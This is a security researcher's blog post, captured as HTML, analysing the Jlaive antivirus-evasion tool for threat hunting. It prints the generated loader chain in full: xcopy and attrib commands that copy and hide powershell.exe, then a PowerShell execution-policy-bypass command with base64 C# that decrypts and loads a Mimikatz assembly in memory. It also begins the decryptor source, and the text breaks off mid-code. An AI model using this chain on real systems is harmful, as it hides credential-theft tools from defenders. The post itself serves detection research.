<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.8">
<link rel="alternate" type="application/rss+xml" href="/jstnk9/blog/rss.xml" title="Welcome to Jstnk webpage RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/jstnk9/blog/atom.xml" title="Welcome to Jstnk webpage Atom Feed">
<link rel="alternate" type="application/rss+xml" href="/jstnk9/research/rss.xml" title="Welcome to Jstnk webpage RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/jstnk9/research/atom.xml" title="Welcome to Jstnk webpage Atom Feed">
<link rel="alternate" type="application/rss+xml" href="/jstnk9/malwareandhunting/rss.xml" title="Welcome to Jstnk webpage RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/jstnk9/malwareandhunting/atom.xml" title="Welcome to Jstnk webpage Atom Feed"><title data-react-helmet="true">Using Jlaive to create batch files from .NET assemblies for defense evasion | Welcome to Jstnk webpage</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_tag" content="default"><meta data-react-helmet="true" property="og:title" content="Using Jlaive to create batch files from .NET assemblies for defense evasion | Welcome to Jstnk webpage"><meta data-react-helmet="true" name="description" content="Summary"><meta data-react-helmet="true" property="og:description" content="Summary"><meta data-react-helmet="true" property="og:type" content="article"><meta data-react-helmet="true" property="article:published_time" content="2022-05-24T00:00:00.000Z"><meta data-react-helmet="true" property="article:author" content="https://twitter.com/Joseliyo_Jstnk"><meta data-react-helmet="true" property="article:tag" content="threat hunting,detection,visibility,research,.NET"><link data-react-helmet="true" rel="shortcut icon" href="/jstnk9/img/favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool"><link data-react-helmet="true" rel="alternate" href="https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool" hreflang="x-default"><link rel="stylesheet" href="/jstnk9/assets/css/styles.26cc7d61.css">
<link rel="preload" href="/jstnk9/assets/js/runtime~main.f4b21a33.js" as="script">
<link rel="preload" href="/jstnk9/assets/js/main.f0c50aa8.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/jstnk9/"><div class="navbar__logo"><img src="/jstnk9/img/msq.png" alt="logo" class="themedImage_TMUO themedImage--light_4Vu1"><img src="/jstnk9/img/msq.png" alt="logo" class="themedImage_TMUO themedImage--dark_uzRr"></div></a><a class="navbar__item navbar__link" href="/jstnk9/docs/intro">Home</a><a class="navbar__item navbar__link" href="/jstnk9/blog">Blog</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/jstnk9/research">Research</a><a class="navbar__item navbar__link" href="/jstnk9/malwareandhunting">Malware &amp; Hunting</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/jstnk9" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a><div class="toggle_iYfV toggle_2i4l toggleDisabled_xj38"><div class="toggleTrack_t-f2" role="button" tabindex="-1"><div class="toggleTrackCheck_mk7D"><span class="toggleIcon_pHJ9">ðŸŒœ</span></div><div class="toggleTrackX_dm8H"><span class="toggleIcon_pHJ9">ðŸŒž</span></div><div class="toggleTrackThumb_W6To"></div></div><input type="checkbox" class="toggleScreenReader_h9qa" aria-label="Switch between dark and light mode"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper blog-wrapper blog-post-page"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_q+wC thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_9G5K margin-bottom--md">Recent posts</div><ul class="sidebarItemList_6T4b"><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/jstnk9/research/Malicious-Iran-Document-APT">Malicious document identified in the conflict Israel &amp; Gaza themed about terrorist organizations related to Iran</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/jstnk9/research/GobRAT-Malware">Dissecting GobRAT behaviors - Linux malware</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/jstnk9/research/AsyncRAT-Analysis">Analyzing AsyncRAT distributed in Colombia by Blind Eagle</a></li><li class="sidebarItem_cjdF"><a aria-current="page" class="sidebarItemLink_zyXk sidebarItemLinkActive_wcJs" href="/jstnk9/research/Jlaive-Antivirus-Evasion-Tool">Using Jlaive to create batch files from .NET assemblies for defense evasion</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/jstnk9/research/InstallScreenSaver-SCR-files">Executing SCR files using desk.cpl and InstallScreenSaver API Call</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/jstnk9/research/DLL-Hijacking-with-DeviceCensus.exe-on-Windows-11">DLL Hijacking with DeviceCensus.exe on Windows 11</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h1 class="blogPostTitle_d4p0" itemprop="headline">Using Jlaive to create batch files from .NET assemblies for defense evasion</h1><div class="blogPostData_-Im+ margin-vert--md"><time datetime="2022-05-24T00:00:00.000Z" itemprop="datePublished">May 24, 2022</time> Â· <!-- -->7 min read</div><div class="row margin-top--md margin-bottom--sm"><div class="col col--6 authorCol_8c0z"><div class="avatar margin-bottom--sm"><a href="https://twitter.com/Joseliyo_Jstnk" target="_blank" rel="noopener noreferrer" class="avatar__photo-link avatar__photo"><img class="image_9q7L" src="https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg" alt="Jose Luis SÃ¡nchez MartÃ­nez"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/Joseliyo_Jstnk" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Jose Luis SÃ¡nchez MartÃ­nez</span></a></div><small class="avatar__subtitle" itemprop="description">Security Researcher</small></div></div></div></div></header><div class="markdown" itemprop="articleBody"><h2 class="anchor anchorWithStickyNavbar_y2LR" id="summary">Summary<a aria-hidden="true" class="hash-link" href="#summary" title="Direct link to heading">â€‹</a></h2><p>Jlaive is a project created to evade antivirus by creating batch files from .NET assemblies. The way it does it is very interesting and gives a new window of opportunities to actors to evade defenses and execute their payloads.</p><p>You can find the project on their official GitHub: <a href="https://github.com/ch2sh/Jlaive" target="_blank" rel="noopener noreferrer">https://github.com/ch2sh/Jlaive</a></p><h2 class="anchor anchorWithStickyNavbar_y2LR" id="creating-the-batch-file-with-jlaive">Creating the batch file with Jlaive<a aria-hidden="true" class="hash-link" href="#creating-the-batch-file-with-jlaive" title="Direct link to heading">â€‹</a></h2><p>In order to test the operation and the different events generated by this tool on a system, batch files must first be generated. The project currently provides two ways to do this.</p><ul><li>Using the CLI file: <a href="https://github.com/ch2sh/Jlaive/tree/main/Jlaive-CLI" target="_blank" rel="noopener noreferrer">Jlaive-CLI</a></li><li>Using the GUI: <a href="https://github.com/ch2sh/Jlaive/tree/main/Jlaive" target="_blank" rel="noopener noreferrer">Jlaive</a></li></ul><p>To test the behavior of the generated batch file, we are going to use an assembly from a known GitHub project that aims to load Mimikatz in memory through an injection.</p><p>The configuration used in Jlaive to create the batch file was as follows.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/1-creatingbatch.png" alt="configuration-jlaive"></p><h2 class="anchor anchorWithStickyNavbar_y2LR" id="executing-the-assembly-mimikatz-batch-file">Executing the assembly (Mimikatz batch file)<a aria-hidden="true" class="hash-link" href="#executing-the-assembly-mimikatz-batch-file" title="Direct link to heading">â€‹</a></h2><p>For this case, the .NET assembly used is KatzNetAssembly, which can be found in their GitHub <a href="https://github.com/med0x2e/NET-Assembly-Inject-Remote" target="_blank" rel="noopener noreferrer">https://github.com/med0x2e/NET-Assembly-Inject-Remote</a>.</p><p>When Jlaive is used to generate the batch file, the result is the expected .bat file. Looking at the contents of the .bat file in this case, we can see something like the following image.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/2-codemimikatz.jpg" alt="codemimi"></p><p>As a test, I uploaded to VirusTotal both the original KatzNetAssembly binary and the generated batch file to check that vendors detected both as malicious, since Mimikatz is considered malicious by the vast majority of vendors.</p><p>First, the KatzNetAssembly binary was detected by 43 different engines.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/3-katznetassemblyVT.jpg" alt="katz_vt"></p><p>In contrast, the batch file generated above was not detected by any of them.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/4-katznetassemblybatchVT.jpg" alt="katzbatch_vt"></p><p>As soon as the .bat file is executed, you can see how Mimikatz is loaded for use by the user.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/5-mimirunning.png" alt="Mimikatzrunning"></p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="high-level-processes-events">High level processes events<a aria-hidden="true" class="hash-link" href="#high-level-processes-events" title="Direct link to heading">â€‹</a></h3><p>When the batch file is executed, different events take place in the operating system, ranging from the creation of temporary files to be used (for compilation purposes) to the copying of the legitimate powershell binary. The following image is a high-level visualization of the events that occur in the operating system.  </p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/procdot_1.png" alt="processes_events"></p><p>The quality of the image is not the best (procdot pls :D), but it is useful to see at a high level all the events that happen related to files, processes, threads, registry keys, etc. In the following sections we will go in detail in the most important events of the previous image.</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="genealogy">Genealogy<a aria-hidden="true" class="hash-link" href="#genealogy" title="Direct link to heading">â€‹</a></h3><p>Taking a look at the process genealogy generated after the execution, we can see the following activity that took place when we executed the batch file:</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/6-genologyprocessmimikatz.png" alt="genealogy"></p><p>From top to bottom, the processes with their corresponding command lines that are launched during execution are as follows.</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="cmdexe---2980">cmd.exe - 2980<a aria-hidden="true" class="hash-link" href="#cmdexe---2980" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32\cmd.exe /c &quot;&quot;C:\Users\lab\Desktop\mimi\NET-Assembly-Inject-Remote-master\KatzNetAssembly\bin\Debug\KatzNetAssembly.bat&quot; &quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>This is the initial execution of the batch file. From this point on, the auto-generated batch file performs different actions on the system when it is executed.</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="cmdexe---9420">cmd.exe - 9420<a aria-hidden="true" class="hash-link" href="#cmdexe---9420" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32\cmd.exe  /S /D /c&quot; echo F&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>This process does not perform any particular action. This is because in the first lines of the batch file the following information can be observed.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/7-twocmm.png" alt="twocommands"></p><p>Line 2 of the previous image shows how the <code>|</code> character exists without being escaped by <code>^</code>. Therefore, the first part before the <code>|</code> character will be launched as a new process that will simply do a <code>echo F</code> (this same cmd.exe process with PID 9420), and the second part after the <code>|</code> character will be the execution of a new process called by <code>xcopy.exe</code>, which we will see its purpose below.</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="xcopyexe---10188">xcopy.exe - 10188<a aria-hidden="true" class="hash-link" href="#xcopyexe---10188" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">xcopy  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe &quot;C:\Users\lab\Desktop\mimi\NET-Assembly-Inject-Remote-master\KatzNetAssembly\bin\Debug\KatzNetAssembly.bat.exe&quot; /y</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Xcopy is a Microsoft Windows binary that can be used to copy files and directories. In this case, the copy that is made is <code>powershell.exe</code> with the same name as the initial batch file, leaving finally in this case the name <code>KatzNetAssembly.bat.exe</code>.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/8-createdfileswrite.jpg" alt="writefilesxcopy"></p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="attribexe---3672">attrib.exe - 3672<a aria-hidden="true" class="hash-link" href="#attribexe---3672" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">attrib  +s +h &quot;C:\Users\lab\Desktop\mimi\NET-Assembly-Inject-Remote-master\KatzNetAssembly\bin\Debug\KatzNetAssembly.bat.exe&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p><code>attrib</code> is another Microsoft Windows utility. It is used in this case to set attributes assigned to the newly copied file.</p><ul><li>+s: Sets the System file attribute. </li><li>+h: Sets the Hidden file attribute.</li></ul><h3 class="anchor anchorWithStickyNavbar_y2LR" id="katznetassemblybatexe---8576">KatzNetAssembly.bat.exe - 8576<a aria-hidden="true" class="hash-link" href="#katznetassemblybatexe---8576" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">KatzNetAssembly.bat.exe  -noprofile  -executionpolicy bypass -command $FlOctL = [System.IO.File]::ReadAllText(&#x27;C:\Users\lab\Desktop\mimi\NET-Assembly-Inject-Remote-master\KatzNetAssembly\bin\Debug\KatzNetAssembly.bat&#x27;).Split([Environment]::NewLine);$hUtefJ = $FlOctL[$FlOctL.Length - 1];$kADuSQ = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&#x27;dXNpbmcgU3lzdGVtLlRleHQ7dXNpbmcgU3lzdGVtLklPO3VzaW5nIFN5c3RlbS5JTy5Db21wcmVzc2lvbjt1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5OyBwdWJsaWMgY2xhc3Mgc2t2Z1pSIHsgcHVibGljIHN0YXRpYyBieXRlW10geVhMZVdlKGJ5dGVbXSBpbnB1dCwgYnl0ZVtdIGtleSwgYnl0ZVtdIGl2KSB7IEFlc01hbmFnZWQgYWVzID0gbmV3IEFlc01hbmFnZWQoKTsgYWVzLk1vZGUgPSBDaXBoZXJNb2RlLkNCQzsgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsgSUNyeXB0b1RyYW5zZm9ybSBkZWNyeXB0b3IgPSBhZXMuQ3JlYXRlRGVjcnlwdG9yKGtleSwgaXYpOyBieXRlW10gZGVjcnlwdGVkID0gZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soaW5wdXQsIDAsIGlucHV0Lkxlbmd0aCk7IGRlY3J5cHRvci5EaXNwb3NlKCk7IGFlcy5EaXNwb3NlKCk7IHJldHVybiBkZWNyeXB0ZWQ7IH0gcHVibGljIHN0YXRpYyBieXRlW10geFpQcEdaKGJ5dGVbXSBieXRlcykgeyBNZW1vcnlTdHJlYW0gbXNpID0gbmV3IE1lbW9yeVN0cmVhbShieXRlcyk7IE1lbW9yeVN0cmVhbSBtc28gPSBuZXcgTWVtb3J5U3RyZWFtKCk7IHZhciBncyA9IG5ldyBHWmlwU3RyZWFtKG1zaSwgQ29tcHJlc3Npb25Nb2RlLkRlY29tcHJlc3MpOyBncy5Db3B5VG8obXNvKTsgZ3MuRGlzcG9zZSgpOyBtc2kuRGlzcG9zZSgpOyBtc28uRGlzcG9zZSgpOyByZXR1cm4gbXNvLlRvQXJyYXkoKTsgfSB9&#x27;));Add-Type -TypeDefinition $kADuSQ;[System.Reflection.Assembly]::Load([skvgZR]::xZPpGZ([skvgZR]::yXLeWe([System.Convert]::FromBase64String($hUtefJ), [System.Convert]::FromBase64String(&#x27;NWgsuaovf9gO9aKy86zcaVaagsVYYBrngI5j7GXrTW8=&#x27;), [System.Convert]::FromBase64String(&#x27;oEMFGnnW7fwO+yXIvucIbA==&#x27;)))).EntryPoint.Invoke($null, (, [string[]] (&#x27;&#x27;)))</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>The <code>KatzNetAssembly.bat.exe</code> file is actually <code>PowerShell.exe</code>, which in this case is executed through a series of parameters and a command through <code>-command</code>, where it first reads the batch file information and then loads the assembly in memory to run Mimikatz.</p><p>This is achieved by the <code>Add-Type</code> cmdlet which adds the .NET class to the <code>PowerShell</code> session and with the help of <code>System.Reflection.Assembly::Load</code> the payload is loaded into memory. </p><p>When these processes are executed to perform such compilations, it is important to know that there are a series of temporary files that are generated in the system. In this case, we will focus a little more on the files named <code>wzpaloqi.0.cs</code> and <code>wzpaloqi.cmdline</code>. The latter will be used later by <code>csc.exe</code> which contains addresses to compile the code.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/9-tmpfiles.jpg" alt="tmpfiles"></p><p>Subsequently, it also removes these files from the system.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/9-tmpfilesdelete.jpg" alt="tmpfilesdeleted"></p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="cscexe---5952">csc.exe - 5952<a aria-hidden="true" class="hash-link" href="#cscexe---5952" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe&quot; /noconfig /fullpaths @&quot;C:\Users\lab\AppData\Local\Temp\wzpaloqi.cmdline&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Due to the above execution to load the assembly into memory, <code>csc.exe</code> is launched to perform the compilation (<code>csc.exe</code> is used by .NET to compile C# code). </p><p>As stated above, the <code>wzpaloqi.cmdline</code> file that is passed as a parameter to <code>csc.exe</code> contains the addresses to compile the code. In this case, the contents are as follows</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">/t:library /utf8output /R:&quot;System.dll&quot; /R:&quot;C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll&quot; /out:&quot;C:\Users\lab\AppData\Local\Temp\wzpaloqi.dll&quot; /D:DEBUG /debug+ /optimize- /warnaserror  &quot;C:\Users\lab\AppData\Local\Temp\wzpaloqi.0.cs&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Note the use of the <code>/t</code> parameter to generate a <code>Library</code> TargetType. Also the references to the <code>System.dll</code> and <code>System.Management.Automation.dll</code> (Powershelll) DLLs. Finally, the output file to <code>wzpaloqi.dll</code>.</p><p><img src="https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/10-dllcreated.jpg" alt="tmpfilesdeleted"></p><p>The <code>wzpaloqi.0.cs</code> file contains the definition of the class that was previously used by the <code>Add-Type</code> cmdlet in the <code>PowerShell</code> execution. The content of this C# file would look like the following.</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI c"><pre tabindex="0" class="prism-code language-c codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">using System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">IO</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">IO</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Compression</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Security</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Cryptography</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class sIRAVQ </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  public </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">agudvC</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> input</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> key</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> iv</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AesManaged aes </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> new </span><span class="token function" style="color:#d73a49">AesManaged</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    aes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Mode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> CipherMode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">CBC</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    aes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Padding </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> PaddingMode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PKCS7</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ICryptoTransform decryptor </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> aes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">CreateDecryptor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> iv</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> decrypted </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> decryptor</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">TransformFinalBlock</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">input</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> input</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    decryptor</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Dispose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    aes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Dispose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> decrypted</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  public </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WpDGoD</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MemoryStream msi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> new </span><span class="token function" style="color:#d73a49">MemoryStream</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MemoryStream mso </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> new </span><span class="token function" style="color:#d73a49">MemoryStream</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    var gs </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> new </span><span class="token function" style="color:#d73a49">GZipStream</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">msi</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> CompressionMode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Decompress</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    gs</span><span class="token punctuation" 